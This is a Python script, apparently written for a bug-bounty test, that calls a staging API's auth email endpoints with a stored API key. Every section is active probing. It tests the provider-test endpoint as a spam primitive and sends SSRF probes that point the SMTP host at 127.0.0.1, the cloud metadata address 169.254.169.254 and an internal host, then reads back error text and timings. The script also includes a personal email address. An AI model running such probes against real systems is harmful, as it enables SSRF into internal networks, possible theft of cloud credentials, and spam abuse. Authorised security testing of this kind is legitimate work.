# -*- coding: utf-8 -*-
"""W5g: email test endpoints - SSRF probe (send_test_email) + spam primitive (email_provider/test)."""
import json, ssl, http.client, time

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
ME = "libobo1229@gmail.com"

def api(method, path, body=None):
    conn = http.client.HTTPSConnection(API_HOST, timeout=40, context=ctx)
    hdr = {"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY}
    if body is not None:
        hdr["Content-Type"] = "application/json"
        body = json.dumps(body)
    t0 = time.time()
    conn.request(method, API_BASE + path, body=body, headers=hdr)
    r = conn.getresponse()
    data = r.read().decode("utf-8", "replace")
    dt = time.time() - t0
    conn.close()
    return r.status, data, dt

base = "/projects/%s/branches/%s/auth" % (PA, PAMAIN)

# T1: email_provider/test -> own inbox (shared provider)
st, d, dt = api("POST", base + "/email_provider/test", {"recipient_email": ME})
print("T1 provider/test self: %d %.1fs %s" % (st, dt, d[:300]))

# T2: provider/test with bogus recipient format
st, d, dt = api("POST", base + "/email_provider/test", {"recipient_email": "not-an-email"})
print("T2 provider/test bogus: %d %.1fs %s" % (st, dt, d[:300]))

# T3: send_test_email SSRF probes - error echo discrimination (own inbox as recipient only)
probes = [
    ("loopback smtp", "127.0.0.1", 25),
    ("metadata 80", "169.254.169.254", 80),
    ("metadata 25", "169.254.169.254", 25),
    ("neon internal host", "console-stage.neon.build", 25),
    ("public smtp", "smtp.gmail.com", 587),
]
for tag, host, port in probes:
    body = {"host": host, "port": port, "username": "probe", "password": "x",
            "sender_email": ME, "sender_name": "SecTest", "recipient_email": ME}
    st, d, dt = api("POST", base + "/send_test_email", body)
    print("T3 %s (%s:%d): %d %.1fs %s" % (tag, host, port, st, dt, d[:280].replace("\n", " ")))
    time.sleep(1.0)
